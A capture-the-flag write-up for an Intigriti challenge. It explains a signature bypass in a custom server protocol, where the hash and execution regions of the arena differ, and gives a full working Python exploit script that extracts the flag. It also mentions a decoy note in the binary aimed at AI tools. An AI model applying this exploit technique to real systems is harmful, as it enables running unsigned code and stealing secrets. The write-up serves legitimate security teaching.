# Intigriti November 2026 Challenge — Signed-Code Check Bypass via Arena Layout Confusion

## TL;DR

The challenge serves a custom ELF binary (`superfastserver`) from its own web root. The binary implements a custom protocol behind `POST /custom_protocol` that lets you run RSA-2048-signed code. The signature check hashes one region of a shared memory arena but executes code on a different region, so by padding the arena with a `PING` command (which writes to the arena but doesn't update any offset), you can replay the signed sample code while substituting your own unsigned input. The signed code is a Brainfuck interpreter with no tape bounds check, and the flag sits 0x100 bytes above the tape in thread-local storage.

**Flag:** `INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}`

---

## Step 0 — Recon

The challenge landing page at `https://challenge-1126.challenges.intigriti.io/` is a standard Intigriti challenge page. The first thing I noticed was the response header:

```
x-powered-by: superfastserver Version 2.0.0
```

A custom server — that's interesting. Poking around, I found:

- `/changelog.html` — describes three versions; v2.0.0 added a "custom protocol, protected by a very good secret to allow execution of RSA-2048 signed code" and fixed a path traversal vulnerability
- `/documentation.html` — warns: "The server serves files from the PWD" and "DON'T run the server binary in the PWD"

That documentation warning is a huge hint. If the server is running from its own directory and serves files from the PWD, the binary itself is downloadable. Sure enough:

```bash
curl -o superfastserver https://challenge-1126.challenges.intigriti.io/superfastserver
```

A 47,880-byte ELF binary. Game on.

## Step 1 — Static Analysis

Running `strings` on the binary immediately reveals juicy things:

- `/custom_protocol` — a route
- `/the_real.flag` — the flag file, loaded into memory at connection time
- `AUTH`, `DATA`, `CODE`, `SIGN`, `EXEC`, `PING`, `HELP` — protocol commands
- A 106-byte auth code (at file offset `0x9660`) — the "very good secret"
- An RSA-2048 modulus

The binary also contains a note targeting AI tools, pointing at a "weak seed" and a memory-corruption bug in the HTTP and RSA code. That's a red herring — the RSA implementation is actually sound (e = 65537, full SHA-256 comparison).

### The Custom Protocol

Disassembling the protocol handler (function at file offset `0x5CB0`), the message format is:

```
0x77 ('w') | 4-byte LE payload length | 4-byte command | payload
```

All payloads are appended sequentially to a single memory buffer (the "arena"). Each command records specific offsets:

| Command | Arena behavior |
|---------|---------------|
| `CODE`  | Appends payload; records `code_off` and `code_len` |
| `DATA`  | Appends payload; records `data_off` and `data_len` |
| `SIGN`  | Appends payload (256-byte RSA signature); records `sign_off` |
| `PING`  | Appends payload; records **nothing** |
| `EXEC`  | Hashes and verifies, then executes |

### The Bug: Hash/Execute Mismatch

Here's the critical flaw in `EXEC`:

1. **Hashing**: `SHA-256(arena[code_off : code_off + code_len + data_len])` — it assumes data immediately follows code in the arena
2. **Execution**: Calls the code at `arena[code_off]` with input pointer `arena[data_off]`

The only validation on `data_off` is that it must be `>= code_off`.

This means: if you can place signed content right after the code (to satisfy the hash) but put your *actual* data somewhere else in the arena (to control execution input), the signature check passes but your unsigned data gets used.

And `PING` is the tool for that — it writes to the arena without recording any offset, acting as invisible padding.

## Step 2 — The Signed Sample

The `HELP` blob at file offset `0x89D0` contains a validly signed sample:

| Component | Size | Description |
|-----------|------|-------------|
| Code | 396 bytes | A Brainfuck interpreter |
| Program | 424 bytes | A BF program (the sample input) |
| Signature | 256 bytes | RSA-2048 signature over `code + program` |

I verified locally that `sig^65537 mod n` ends in `SHA-256(code || program)`. Sending this sample to the server as-is returns:

```
I hope you like this so far. Keep going!
```

The signed code is a Brainfuck interpreter. The interesting properties:

- The tape pointer starts at `fs:-0x160` (thread-local storage)
- `>` and `<` move the pointer with **no bounds check**
- `.` sends one byte over the socket
- The handler copies `/the_real.flag` to `fs:-0x60` when the connection starts

That means the flag is exactly **0x100 bytes above** the tape start. 256 `>` instructions will reach it.

## Step 3 — The Exploit

The attack plan:

1. Send `CODE` with the signed interpreter → `arena[0:396]`, records `code_off=0, code_len=396`
2. Send `PING` with the signed program → `arena[396:820]`, records **nothing** (but it's there for the hash)
3. Send `SIGN` with the signature → `arena[820:1076]`
4. Send `DATA` with our BF program → `arena[1076:1500]`, records `data_off=1076, data_len=424`
5. Send `EXEC`

When `EXEC` runs:
- It hashes `arena[0 : 0 + 396 + 424]` = `arena[0:820]` = **code + signed program** (from the PING) → hash matches!
- It calls the interpreter with input at `arena[1076]` = **our unsigned program**

My BF program:

```python
prog = b">" * 256 + b"[.>]"  # Walk 256 cells up to the flag, print until NUL
prog = prog.ljust(424, b"\0")  # Pad to 424 so data_len matches the signed sample
```

## Step 4 — Exploitation

```python
#!/usr/bin/env python3
import socket, ssl, struct, sys
from urllib.parse import urlparse

binary = open(sys.argv[1], "rb").read()
base = sys.argv[2] if len(sys.argv) > 2 else "https://challenge-1126.challenges.intigriti.io"

# Carve components from the binary
blob = binary[0x89D0:0x89D0 + 0x458]          # HELP sample
code      = blob[9:405]                         # 396 bytes - BF interpreter
signed_prog = blob[414:838]                     # 424 bytes - signed BF program  
sig       = blob[847:1103]                      # 256 bytes - RSA signature
secret    = binary[0x9660:0x9660 + 0x6A]       # 106 bytes - auth code

# Our payload: walk to the flag and print it
prog = (b">" * 256 + b"[.>]").ljust(len(signed_prog), b"\0")

def msg(cmd, payload=b""):
    return b"w" + struct.pack("<I", len(payload)) + cmd + payload

body = (secret
        + msg(b"CODE", code)            # arena[0:396]
        + msg(b"PING", signed_prog)     # arena[396:820]   - hash filler
        + msg(b"SIGN", sig)             # arena[820:1076]
        + msg(b"DATA", prog)            # arena[1076:1500] - actual input
        + msg(b"EXEC"))

u = urlparse(base)
port = u.port or (443 if u.scheme == "https" else 80)
req = (b"POST /custom_protocol HTTP/1.1\r\nHost: " + u.hostname.encode()
       + b"\r\nContent-Type: application/octet-stream\r\nContent-Length: "
       + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)

s = socket.create_connection((u.hostname, port), timeout=30)
if u.scheme == "https":
    s = ssl.create_default_context().wrap_socket(s, server_hostname=u.hostname)
s.sendall(req)
out = b""
while True:
    chunk = s.recv(65536)
    if not chunk:
        break
    out += chunk
head, _, resp = out.partition(b"\r\n\r\n")
print(resp)
```

Output:

```
ACK\0ACK\0PONGACK\0ACK\0INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}
```

The five responses before the flag are: AUTH acknowledgment, CODE acknowledgment, PING response, SIGN acknowledgment, and DATA acknowledgment.

### Negative Controls

To confirm the bypass works as described:

| Test | Result |
|------|--------|
| Same payload but `DATA` instead of `PING` for the signed program (no arena confusion) | `NAKR` — signature rejected |
| Original signed sample unmodified | `I hope you like this so far. Keep going!` — signature accepted |

## Summary

The core vulnerability is a **hash/execute mismatch** in the `EXEC` handler. The signature verification hashes a contiguous range starting from the code offset, assuming data follows immediately. But execution uses a separately recorded data offset. The `PING` command acts as an arena-layout primitive — it writes to the shared buffer without registering an offset — letting an attacker wedge signed content into the hash window while pointing execution at unsigned data elsewhere in the arena.

Combined with the lack of tape bounds checking in the signed Brainfuck interpreter and the flag's predictable location in thread-local storage, this results in full flag exfiltration in a single unauthenticated HTTP request.
